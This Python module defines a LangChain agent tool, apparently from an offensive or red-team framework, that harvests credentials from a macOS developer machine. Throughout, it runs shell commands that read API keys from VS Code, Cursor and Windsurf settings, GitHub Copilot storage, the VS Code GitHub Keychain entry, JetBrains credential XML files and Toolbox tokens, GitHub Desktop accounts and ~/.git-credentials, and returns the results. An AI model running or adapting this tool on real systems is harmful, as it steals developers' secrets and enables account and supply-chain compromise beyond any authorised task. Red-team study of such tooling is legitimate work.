"""IDE and developer tool credential discovery.

Developer machines universally have at least one IDE. VS Code, Cursor, and
JetBrains products store authentication tokens, API keys embedded in extension
settings, and developer account credentials. VS Code settings.json is
increasingly a credential dumping ground as extensions accept tokens directly.

MITRE ATT&CK: T1552.001 (Unsecured Credentials: Credentials In Files),
              T1555 (Credentials from Password Stores)
"""

from __future__ import annotations

import json

from langchain_core.tools import tool

from ..base import run_command


# VS Code / Cursor / Windsurf variants share the same config structure
_VSCODE_VARIANTS = [
    ("VS Code",    "~/Library/Application Support/Code"),
    ("Cursor",     "~/Library/Application Support/Cursor"),
    ("Windsurf",   "~/Library/Application Support/Windsurf"),
    ("VSCodium",   "~/Library/Application Support/VSCodium"),
]

# JetBrains product directories
_JETBRAINS_PRODUCTS = [
    "IntelliJIdea", "PyCharm", "GoLand", "WebStorm", "PhpStorm",
    "CLion", "DataGrip", "RubyMine", "AppCode", "AndroidStudio",
    "Rider",
]

# Patterns in settings.json that may indicate stored credentials
_SETTINGS_SECRET_PATTERN = (
    r"(?i)(api[_-]?key|secret|token|password|credential|auth|access.?key)"
)


@tool
def find_ide_credentials() -> str:
    """Discover credentials stored in IDE configuration files and developer tools.

    Checks:
    - VS Code / Cursor / Windsurf settings.json for embedded API keys
    - VS Code extension global storage (GitHub Copilot token, AI assistant keys)
    - VS Code GitHub authentication token (stored in macOS Keychain)
    - JetBrains credential XML files (~/Library/Application Support/JetBrains/)
    - JetBrains Toolbox auth token
    - Xcode developer account credentials
    - GitHub Desktop stored credentials
    - Tower / Sourcetree / Fork Git GUI credentials
    - ~/.gitconfig for credential helper configuration

    Returns:
        Credential-bearing IDE configuration files and token locations.
    """
    sections = []

    # ── VS Code variants ──────────────────────────────────────────────────────
    for name, base_path in _VSCODE_VARIANTS:
        settings_path = f"{base_path}/User/settings.json"
        settings = run_command(f"cat '{settings_path}' 2>/dev/null")
        if not settings.stdout.strip():
            continue

        # Scan settings.json for credential-bearing keys
        cred_lines = run_command(
            f"cat '{settings_path}' 2>/dev/null | "
            f"grep -iE '{_SETTINGS_SECRET_PATTERN}' | grep -v '^\\s*//' | head -20"
        )
        if cred_lines.stdout.strip():
            sections.append(
                f"=== {name} settings.json — credential-bearing entries ===\n"
                + cred_lines.stdout.strip()
            )
        else:
            sections.append(f"=== {name} settings.json ===\n(no credential patterns found)")

        # Extension global storage
        ext_storage = run_command(
            f"ls '{base_path}/User/globalStorage/' 2>/dev/null | head -30"
        )
        if ext_storage.stdout.strip():
            sections.append(
                f"=== {name} extension global storage directories ===\n"
                + ext_storage.stdout.strip()
            )

        # GitHub Copilot extension specifically
        copilot_paths = [
            f"{base_path}/User/globalStorage/github.copilot",
            f"{base_path}/User/globalStorage/github.copilot-chat",
        ]
        for cp in copilot_paths:
            copilot = run_command(f"ls '{cp}/' 2>/dev/null && cat '{cp}'/*.json 2>/dev/null | head -20")
            if copilot.stdout.strip():
                sections.append(
                    f"=== {name} GitHub Copilot storage ===\n{copilot.stdout.strip()}"
                )
                break

    # ── VS Code GitHub token in Keychain ──────────────────────────────────────
    vscode_gh = run_command(
        "security find-generic-password -s 'vscode.github-authentication' 2>&1 "
        "| grep -v 'SecKeychainSearch\\|errSecItemNotFound'"
    )
    if vscode_gh.stdout.strip() and "errSecItemNotFound" not in vscode_gh.stdout:
        sections.append(
            "=== VS Code GitHub token (macOS Keychain) ===\n"
            + vscode_gh.stdout.strip()
        )

    # ── JetBrains ─────────────────────────────────────────────────────────────
    jb_base = run_command(
        "ls ~/Library/Application\\ Support/JetBrains/ 2>/dev/null"
    )
    if jb_base.stdout.strip():
        sections.append(
            "=== JetBrains product directories ===\n"
            + jb_base.stdout.strip()
        )

        # Security.xml / credentials XML in each product
        cred_files = run_command(
            "find ~/Library/Application\\ Support/JetBrains -name 'security.xml' "
            "-o -name 'credentials.xml' -o -name 'passwords.xml' 2>/dev/null | head -10"
        )
        if cred_files.stdout.strip():
            sections.append(
                "=== JetBrains credential XML files ===\n"
                + cred_files.stdout.strip()
            )
            for cf in cred_files.stdout.splitlines()[:5]:
                cf = cf.strip()
                content = run_command(f"cat '{cf}' 2>/dev/null | head -30")
                if content.stdout.strip():
                    sections.append(f"--- {cf} ---\n{content.stdout.strip()}")

    # ── JetBrains Toolbox ─────────────────────────────────────────────────────
    toolbox = run_command(
        "cat ~/Library/Application\\ Support/JetBrains/Toolbox/.settings.json 2>/dev/null "
        "| python3 -c 'import sys,json; d=json.load(sys.stdin); "
        "print(json.dumps({k:v for k,v in d.items() if k in [\"userId\",\"userEmail\",\"token\",\"auth\"]}, indent=2))' "
        "2>/dev/null"
    )
    if toolbox.stdout.strip() and toolbox.stdout.strip() != "{}":
        sections.append(
            f"=== JetBrains Toolbox auth ===\n{toolbox.stdout.strip()}"
        )

    # ── Xcode ─────────────────────────────────────────────────────────────────
    xcode_accounts = run_command(
        "defaults read com.apple.dt.Xcode IDEProvisioningTeams 2>/dev/null | head -20"
    )
    if xcode_accounts.stdout.strip():
        sections.append(
            f"=== Xcode provisioning teams / Apple ID ===\n{xcode_accounts.stdout.strip()}"
        )

    # ── GitHub Desktop ────────────────────────────────────────────────────────
    gh_desktop = run_command(
        "cat ~/Library/Application\\ Support/GitHub\\ Desktop/app-state.json 2>/dev/null "
        "| python3 -c 'import sys,json; d=json.load(sys.stdin); "
        "accts=d.get(\"accounts\",[]) or d.get(\"github-accounts\",[]) or []; "
        "[print(a.get(\"login\",\"?\"), a.get(\"endpoint\",\"?\")) for a in accts]' "
        "2>/dev/null"
    )
    if gh_desktop.stdout.strip():
        sections.append(
            f"=== GitHub Desktop accounts ===\n{gh_desktop.stdout.strip()}"
        )

    # ── Git credential helper ─────────────────────────────────────────────────
    git_cred = run_command("git config --global credential.helper 2>/dev/null")
    git_store = run_command("cat ~/.git-credentials 2>/dev/null | head -10")
    sections.append(
        "=== Git credential configuration ===\n"
        f"credential.helper: {git_cred.stdout.strip() or '(not set)'}\n"
        + (f"~/.git-credentials entries:\n{git_store.stdout.strip()}" if git_store.stdout.strip() else "")
    )

    # ── Tower / Sourcetree / Fork ─────────────────────────────────────────────
    for app_name, plist_key in [
        ("Tower", "com.fournova.Tower3"),
        ("Sourcetree", "com.torusknot.SourceTreeNotMAS"),
        ("Fork", "com.DanPristupov.Fork"),
    ]:
        prefs = run_command(f"defaults read {plist_key} 2>/dev/null | head -20")
        if prefs.stdout.strip():
            sections.append(f"=== {app_name} preferences ===\n{prefs.stdout.strip()}")

    return "\n\n".join(sections)
